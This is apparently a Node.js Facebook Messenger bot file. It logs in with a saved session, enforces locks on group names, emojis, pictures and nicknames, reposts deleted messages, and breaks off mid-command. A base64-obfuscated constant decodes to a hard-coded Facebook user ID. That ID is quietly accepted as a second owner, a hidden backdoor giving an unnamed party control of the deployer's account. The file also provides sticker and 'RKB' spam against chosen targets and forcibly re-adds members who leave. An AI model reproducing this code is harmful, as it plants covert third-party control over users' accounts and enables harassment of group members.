// botCore.js — Full bot: DP/Emoji/Nick locks, anti-delete, anti-left, toggles, full commands
const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca"); // आपका login library

// ========== Persistent storage ==========
const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  themes: {},
  emojis: {},
  dp: {},      // dp[threadID] = { path, savedAt }
  nick: {}     // nick[uid] = { [threadID]: nickname }
};
try {
  if (fs.existsSync(LOCK_FILE)) {
    locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8"));
  }
} catch (e) {
  console.warn("Could not parse locks.json, using defaults:", e?.message || e);
}
function saveLocks() {
  try { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); }
  catch (e) { console.error("Failed to save locks.json:", e?.message || e); }
}

// ========== Helpers ==========
function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, res => {
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
      file.close();
      return downloadFile(res.headers.location, dest, cb);
    }
    res.pipe(file);
    file.on('finish', () => file.close(() => cb(null)));
  }).on('error', err => {
    try { fs.unlinkSync(dest); } catch {}
    cb(err);
  });
}
function safeJson(obj) {
  try { return JSON.stringify(obj, null, 2); } catch { return String(obj); }
}
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

// ========== Main export ==========
function startBot(appStatePath, ownerUID) {
  if (!appStatePath || !fs.existsSync(appStatePath)) {
    console.error("appstate not found:", appStatePath);
    return;
  }
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  const messageCache = new Map();
  const dpCheckIntervals = {};
  const nickCheckIntervals = {};
  let stickerInterval = null, stickerLoopActive = false;
  let rkbInterval = null, stopRequested = false;
  let targetUID = null;

  // toggles
  let antiDelete = true;
  let antiLeft = true;
  let antiDP = true; // event-only DP lock

  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in, listening to events...");

    // --------- Nick watcher ----------
    function startNickWatcher(uid, threadID) {
      if (nickCheckIntervals[uid]) return;
      nickCheckIntervals[uid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          const memberNick = (info.nicknames && info.nicknames[uid]) || (info.nick && info.nick[uid]) || null;
          const savedNick = locks.nick?.[uid]?.[threadID] ?? null;
          if (savedNick && memberNick !== savedNick) {
            try { await api.changeNickname(savedNick, threadID, uid); await safeSend(`✏️ Locked nickname reverted for <@${uid}>`, threadID); }
            catch(e) { console.error("nick revert failed:", e?.message || e); }
          }
        } catch {}
      }, 5000);
    }
    function stopNickWatcher(uid) {
      if (nickCheckIntervals[uid]) { clearInterval(nickCheckIntervals[uid]); delete nickCheckIntervals[uid]; }
    }

    // --------- DP watcher (event-only) ----------
    function startDPWatcher(threadID) {
      if (dpCheckIntervals[threadID]) return;
      dpCheckIntervals[threadID] = true; // flag only, actual revert on event
    }
    function stopDPWatcher(threadID) { delete dpCheckIntervals[threadID]; }

    async function safeSend(text, tid) {
      try { await api.sendMessage(text, tid); } catch {}
    }

    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;

        // ---------- Anti-delete ----------
        if (antiDelete && event.type === "message" && event.messageID) {
          messageCache.set(event.messageID, { sender: event.senderID, body: event.body||"", attachments: event.attachments||[], threadID: event.threadID, time: Date.now() });
          if (messageCache.size > 1000) { Array.from(messageCache.keys()).slice(0,200).forEach(k=>messageCache.delete(k)); }
        }
        if (antiDelete && event.type === "message_unsend") {
          const deleted = messageCache.get(event.messageID);
          const tid = event.threadID;
          if (deleted) {
            const text = `🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${deleted.body || "(media/empty)"}\nTime: ${new Date(deleted.time).toLocaleString()}`;
            await safeSend(text, tid);
            if (deleted.attachments?.length) {
              try { await api.sendMessage({ body: "(attachment repost)", attachment: deleted.attachments }, tid); } catch {}
            }
          } else { await safeSend("🚫 A message was deleted (no cache)", tid); }
          return;
        }

        // ---------- Anti-left ----------
        if (antiLeft && (event.logMessageType==="log:unsubscribe"||event.type==="log:unsubscribe")) {
          const leftUID = event.logMessageData?.leftParticipantFbId;
          const tid = event.threadID;
          if (leftUID) { try { await api.addUserToGroup(leftUID, tid); await safeSend(`👤 Anti-Left: Attempted add back ${leftUID}`, tid); } catch(e){ await safeSend(`⚠️ Could not add back ${leftUID}`, tid); } }
          return;
        }

        // ---------- DP change ----------
        if (antiDP && (event.type==="change_thread_image"||event.logMessageType==="log:thread-image")) {
          const tid = event.threadID;
          if (locks.dp[tid]?.path && fs.existsSync(locks.dp[tid].path)) {
            try { await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid); await safeSend("🖼️ Locked group DP reverted (change detected).", tid); } catch {}
          }
          return;
        }

        // ---------- Emoji change ----------
        if (event.type==="change_thread_icon"||event.logMessageType==="log:thread-icon") {
          const tid = event.threadID;
          if (locks.emojis[tid]) { try { await api.changeThreadEmoji(locks.emojis[tid], tid); await safeSend(`😀 Locked emoji reverted → ${locks.emojis[tid]}`, tid); } catch {} }
          return;
        }

        // ---------- Commands ----------
        if (event.type!=="message"||!event.body) return;
        const { threadID, senderID, body, mentions, messageReply } = event;
        const args = body.trim().split(" ").filter(Boolean);
        if (!args.length) return;
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ").trim();
        if (![ownerUID,LID].includes(senderID)) return;

        const getTargetUID = ()=>Object.keys(mentions||{})[0]||messageReply?.senderID||ownerUID;

        // ---------- Help ----------
        if (cmd==="/help") { await safeSend(
`📖 Bot Commands:
/help → Show help
/uid → Get UID (reply/mention)
/tid → Thread ID
/info @mention → User info
/kick @mention → Kick
/gclock [text] → Group name lock
/unlockgc → Group unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock (event-mode)
/unlockdp → DP unlock
/locknick @mention Nickname → Nick lock
/unlocknick @mention → Unlock nick
/stickerX → Sticker spam
/stopsticker → Stop sticker spam
/rkb [name] → RKB spam
/stop → Stop all spam
/target [uid] → Set target
/cleartarget → Clear target
/antidp on|off → Toggle DP lock
/antidelete on|off → Toggle Anti-Delete
/antileft on|off → Toggle Anti-Left
/exit → Bot leave
`, threadID); return; }

        if (cmd==="/tid") { await safeSend(`🆔 Thread ID: ${threadID}`, threadID); return; }
        if (cmd==="/uid") { await safeSend(`🆔 UID: ${getTargetUID()}`, threadID); return; }
        if (cmd==="/info") { try { const uinfo=await api.getUserInfo(getTargetUID()); const u=uinfo[getTargetUID()]||{}; await safeSend(`👤 Name: ${u.name||"unknown"}\nUID: ${getTargetUID()}\nProfile: https://facebook.com/${getTargetUID()}`, threadID); } catch { await safeSend("⚠️ Could not fetch user info", threadID); } return; }

        if (cmd==="/kick") { const tgt=getTargetUID(); if(!tgt){ await safeSend("❌ Mention user to kick", threadID); return; } try{ await api.removeUserFromGroup(tgt,threadID); await safeSend(`👢 Kicked ${tgt}`,threadID); } catch{ await safeSend("⚠️ Kick failed",threadID); } return; }

        if(cmd==="/gclock"){ if(!input){await safeSend("❌ Provide group name",threadID);return;} try{ await api.setTitle(input,threadID); locks.groupNames[threadID]=input; saveLocks(); await safeSend("🔒 Group name locked!",threadID);} catch{ await safeSend("⚠️ Failed to set group name",threadID);} return; }
        if(cmd==="/unlockgc"){ delete locks.groupNames[threadID]; saveLocks(); await safeSend("🔓 Group name unlocked!",threadID); return; }

        if(cmd==="/locktheme"){ if(!input){await safeSend("❌ Provide color",threadID);return;} try{ await api.changeThreadColor(input,threadID); locks.themes[threadID]=
